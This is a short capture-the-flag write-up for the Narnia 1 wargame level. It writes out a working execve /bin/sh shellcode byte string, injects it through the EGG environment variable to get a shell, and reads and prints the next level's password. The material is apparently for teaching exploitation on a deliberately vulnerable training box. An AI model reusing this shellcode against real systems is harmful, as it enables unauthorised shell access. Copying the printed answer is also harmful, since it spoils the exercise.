# Solution for Narnia 1

If we see the C code, it looks for an environment variable called EGG, and executes whatever is inside the variable, treating it as shellcode, if that environment variable exists. 
So let's give them what they want. Shellcode in Env variable called EGG
To do this, we simply

```text
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

We can check it on the byte level to ensure its right, as python sometimes messes things up 

```text
narnia1@narnia:/narnia$ echo $EGG | xxd
00000000: 31c0 5068 6e2f 7368 682f 2f62 6989 e399  1.Phn/shh//bi...
00000010: 5253 89e1 b00b cd80 0a                   RS.......
```

## Final Exploit

Now we just execute the program, and it will find $EGG and execute our shellcode
```text
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ ls
narnia0  narnia0.c  narnia1  narnia1.c  narnia2  narnia2.c  narnia3  narnia3.c  narnia4  narnia4.c  narnia5  narnia5.c  narnia6  narnia6.c  narnia7  narnia7.c  narnia8  narnia8.c
```

Perfect! We now get the password for the next level
```text
$ cat /etc/narnia_pass/narnia2
nairiepecu
```

The password for narnia2 is 
```text
nairiepecu
```



